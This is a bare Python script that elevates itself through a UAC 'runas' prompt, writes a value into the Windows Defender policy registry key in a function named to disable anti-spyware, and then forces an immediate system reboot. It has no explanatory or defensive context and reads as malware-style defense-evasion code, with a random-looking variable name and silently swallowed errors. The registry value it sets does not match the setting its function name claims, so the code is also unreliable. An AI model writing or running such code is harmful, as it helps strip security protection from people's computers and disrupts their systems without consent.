import winreg
import os
import sys
import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def disable_anti_spyware():
    try:
        IbxaLSvP = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(IbxaLSvP, "ETHernalAV", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(IbxaLSvP)
    except Exception as e:
        pass

def restart_system():
    os.system("shutdown /r /t 0")

if __name__ == "__main__":
    if is_admin():
        disable_anti_spyware()
        restart_system()
    else:
        # Re-run the script with admin privileges
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)